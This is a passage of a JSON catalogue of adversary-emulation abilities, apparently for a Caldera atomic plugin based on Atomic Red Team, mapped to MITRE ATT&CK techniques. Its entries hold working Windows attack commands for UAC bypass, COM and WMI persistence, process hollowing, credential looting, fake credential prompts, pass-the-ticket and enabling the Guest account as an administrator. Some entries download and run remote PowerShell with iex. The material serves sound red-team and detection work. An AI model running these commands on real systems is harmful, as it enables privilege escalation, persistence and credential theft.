            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore",
                    "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force; New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "09f12d8d4611f88f40e0be1a8c036027",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f9a968af61d36983448c74cca5464e17": {
        "description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.013",
            "name": "Event Triggered Execution: PowerShell Profile"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$oldprofile = cat $profile | Select-Object -skiplast 1; Set-Content $profile -Value $oldprofile",
                    "command": "Add-Content $profile -Value \"\"; Add-Content $profile -Value \"Start-Process calc.exe\"; powershell -Command exit",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f9a968af61d36983448c74cca5464e17",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f9cdee5ce418848bdbc268bdfd925f66": {
        "description": "An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1072",
            "name": "Software Deployment Tools"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "if not exist \"%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe\"  ( call ) ELSE ( echo Downloading radmin installer && bitsadmin /transfer myDownloadJob /download /priority normal \"https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi\" %TEMP%\\RadminViewer.msi && msiexec /i \"%TEMP%\\RadminViewer.msi\" /qn ) &&   &&  \"%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f9cdee5ce418848bdbc268bdfd925f66",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "06246b2963b7a0158e347dab3169174e": {
        "description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055.012",
            "name": "Process Injection: Process Hollowing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"notepad\" -ErrorAction Ignore",
                    "command": ". cd6d01_Start-Hollow.ps1; $ppid=Get-Process explorer | select -expand id; Start-Hollow -Sponsor \"C:\\Windows\\System32\\notepad.exe\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "cd6d01_Start-Hollow.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "06246b2963b7a0158e347dab3169174e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9b8c9b3a8451aa69daad549e18ff59e9": {
        "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.\n\nReference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.015",
            "name": "Event Triggered Execution: Component Object Model Hijacking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Recurse -ErrorAction Ignore",
                    "command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'; New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' -Value $env:TEMP\\AtomicTest.dll; New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' -Name 'ThreadingModel' -Value 'Apartment' -PropertyType \"String\"; Start-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9b8c9b3a8451aa69daad549e18ff59e9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "16e6823c4656f5cd155051f5f1e5d6ad": {
        "description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" -ErrorAction Ignore; Remove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\" -ErrorAction Ignore",
                    "command": "Copy-Item d2a901_jsestartup.jse \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"; Copy-Item d2a901_jsestartup.jse \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"; cscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"; cscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "d2a901_jsestartup.jse"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "16e6823c4656f5cd155051f5f1e5d6ad",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1ce648533bf5ede07e4d75a4b9e14979": {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore",
                    "command": "\"%temp%\\uacme\\56 Akagi64.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1ce648533bf5ede07e4d75a4b9e14979",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "6f5096d87a8f9ac4c397215cb58cc978": {
        "description": "Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.\n\nReference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1056.002",
            "name": "Input Capture: GUI Input Capture"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); write-warning $cred.GetNetworkCredential().Password",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6f5096d87a8f9ac4c397215cb58cc978",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9f0fa7e90c494f73b6424d81d3a75dba": {
        "description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "rd \"\\\\?\\C:\\Windows \\\" /S /Q >nul 2>nul && del \"c:\\testbypass.exe\" >nul 2>nul",
                    "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\" && copy \"C:\\Windows\\System32\\cmd.exe\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\" && mklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9f0fa7e90c494f73b6424d81d3a75dba",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "b473176c321f31824c909c73807caf92": {
        "description": "UAC Bypass DccwBypassUAC technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b473176c321f31824c909c73807caf92",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "5ce7136a4547b0bf3ca074c94fb10b24": {
        "description": "Loot local Credentials - powerhell kittie technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1078.003",
            "name": "Valid Accounts: Local Accounts"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); obfuskittiedump -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5ce7136a4547b0bf3ca074c94fb10b24",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d04c129f52b4b6c47582faf785fdb541": {
        "description": "It's running Dll as service to emulate the TinyTurla backdoor\n\n[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1543.003",
            "name": "Create or Modify System Process: Windows Service"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "sc stop W64Time && sc.exe delete W64Time && del %systemroot%\\system32\\w64time.dll && reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /f && reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /f",
                    "command": "copy $PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll %systemroot%\\system32\\ && sc create W64Time binPath= \"c:\\Windows\\System32\\svchost.exe -k TimeService\" type= share start=auto && sc config W64Time DisplayName= \"Windows 64 Time\" && sc description W64Time \"Maintain date and time synch on all clients and services in the network\" && reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /t REG_MULTI_SZ /d \"W64Time\" /f && reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\w64time.dll\" /f && sc start W64Time",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d04c129f52b4b6c47582faf785fdb541",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "938a659c52ed102a8b35c7b1bb49eb11": {
        "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.003",
            "name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"; $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"; $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue; $FilterConsumerBindingToCleanup | Remove-WmiObject; $EventConsumerToCleanup | Remove-WmiObject; $EventFilterToCleanup | Remove-WmiObject",
                    "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 EventNameSpace='root\\CimV2';                 QueryLanguage=\"WQL\";                 Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs; $FilterToConsumerArgs = @{; Filter = [Ref] $Filter; Consumer = [Ref] $Consumer; }; $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "938a659c52ed102a8b35c7b1bb49eb11",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "4593d72a5145e3f494421ac772d37464": {
        "description": "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot dll will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.010",
            "name": "Boot or Logon Autostart Execution: Port Monitors"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg delete \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\ART\" /f >nul 2>&1",
                    "command": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\ART\" /v \"Atomic Red Team\" /d \"C:\\Path\\AtomicRedTeam.dll\" /t REG_SZ",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4593d72a5145e3f494421ac772d37464",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "9a215e75290e28223ecb95c1509c6220": {
        "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055.001",
            "name": "Process Injection: Dynamic-link Library Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$mypid =; mavinject $mypid /INJECTRUNNING; Stop-Process -processname notepad",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9a215e75290e28223ecb95c1509c6220",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f12b4b83ae4eb7e4e1b74d8304cec011": {
        "description": "Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).\nPsExec is used to execute commands on the remote system, and the \"C$\" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1550.003",
            "name": "Use Alternate Authentication Material: Pass the Ticket"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "C:\\PSTools\\PsExec.exe -accepteula \\\\localhost -w c:\\ -c $Env:TEMP\\rubeus.exe asktgt /user:Administrator /password:Password /domain:$Env:USERDOMAIN /outfile:ticket.kirbi; Set-Location $env:TEMP; Move-Item -Force \"\\\\localhost\\c$\\ticket.kirbi\" ticket.kirbi; Write-Host \"Successfully retrieved TGT from 'localhost', now requesting a TGS from local\"; & \"$Env:TEMP\\rubeus.exe\" asktgs /service:cifs/localhost /ticket:ticket.kirbi /ptt; Remove-Item $env:TEMP\\ticket.kirbi; & \"$Env:TEMP\\rubeus.exe\" purge",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f12b4b83ae4eb7e4e1b74d8304cec011",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "501af516bd8b24fee0c7c650ae5cc861": {
        "description": "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.009",
            "name": "Boot or Logon Autostart Execution: Shortcut Modification"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore; Remove-Item \"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\" -ErrorAction Ignore",
                    "command": "$Shell = New-Object -ComObject (\"WScript.Shell\"); $ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\"); $ShortCut.TargetPath=\"cmd.exe\"; $ShortCut.WorkingDirectory = \"C:\\Windows\\System32\"; $ShortCut.WindowStyle = 1; $ShortCut.Description = \"T1547.009.\"; $ShortCut.Save(); $Shell = New-Object -ComObject (\"WScript.Shell\"); $ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\"); $ShortCut.TargetPath=\"cmd.exe\"; $ShortCut.WorkingDirectory = \"C:\\Windows\\System32\"; $ShortCut.WindowStyle = 1; $ShortCut.Description = \"T1547.009.\"; $ShortCut.Save()",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "501af516bd8b24fee0c7c650ae5cc861",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "064e09117d875c248918a5dff1ee241e": {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore",
                    "command": "\"%temp%\\uacme\\59 Akagi64.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "064e09117d875c248918a5dff1ee241e",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "82c3b0718dd2fa00302c0d8f143abeeb": {
        "description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon/logoff.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.004",
            "name": "Boot or Logon Autostart Execution: Winlogon Helper DLL"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force -ErrorAction Ignore",
                    "command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" \"logon\" \"C:\\Windows\\Temp\\atomicNotificationPackage.dll\" -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "82c3b0718dd2fa00302c0d8f143abeeb",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2cd3b633461f406300ce4af9c18dcaa8": {
        "description": "Launches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.001",
            "name": "Access Token Manipulation: Token Impersonation/Theft"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Start-Process $env:TEMP\\NSudo_8.2_All_Components\\NSudo_Launcher\\x64\\NSudoLG.exe -Argument \"-U:T -P:E cmd\"; Start-Sleep -Second 5; Stop-Process -Name \"cmd\" -force -erroraction silentlycontinue",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2cd3b633461f406300ce4af9c18dcaa8",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d0ca00832890baa1d42322cf70fcab1a": {
        "description": "The Adversaries can activate the default Guest user. The guest account is inactivated by default\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1078.001",
            "name": "Valid Accounts: Default Accounts"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "net user guest /active:no",
                    "command": "net user guest /active:yes",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d0ca00832890baa1d42322cf70fcab1a",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "1afbdfbde69a1d79059b0df714b219d9": {
        "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1197",
            "name": "BITS Jobs"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %temp%\\bitsadmin1_flag.ps1 >nul 2>&1",
                    "command": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin1_flag.ps1",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1afbdfbde69a1d79059b0df714b219d9",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c0625323bfaa1d08d5e7579c8c00a2c6": {
        "description": "Netsh interacts with other operating system components using dynamic-link library (DLL) files\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.007",
            "name": "Event Triggered Execution: Netsh Helper DLL"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "netsh.exe add helper C:\\Path\\file.dll",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c0625323bfaa1d08d5e7579c8c00a2c6",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d8b9949b41801f813a76bd19b2079076": {
        "description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.002",
            "name": "Event Triggered Execution: Screensaver"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg import %userprofile%\\backup.reg && del %userprofile%\\backup.reg && del %SystemRoot%\\System32\\evilscreensaver.scr",
                    "command": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg && copy C:\\Windows\\System32\\cmd.exe \"%SystemRoot%\\System32\\evilscreensaver.scr\" && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f && shutdown /r /t 0",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d8b9949b41801f813a76bd19b2079076",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e86ecfb7e9a88077f34ad0660561e35b": {
        "description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1078.001",
            "name": "Valid Accounts: Default Accounts"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "net user #{guest_user} /active:no >nul 2>&1 && net localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1 && net localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /delete >nul 2>&1 && if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup) && if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f >nul 2>&1) && if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /f >nul 2>&1)",
                    "command": "net user #{guest_user} /active:yes && net user #{guest_user} #{guest_password} && net localgroup #{local_admin_group} #{guest_user} /add && net localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add && reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e86ecfb7e9a88077f34ad0660561e35b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "702e25bac965a0efbe89a73ef3f62166": {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n",
        "tactic": "multiple",
        "technique": {
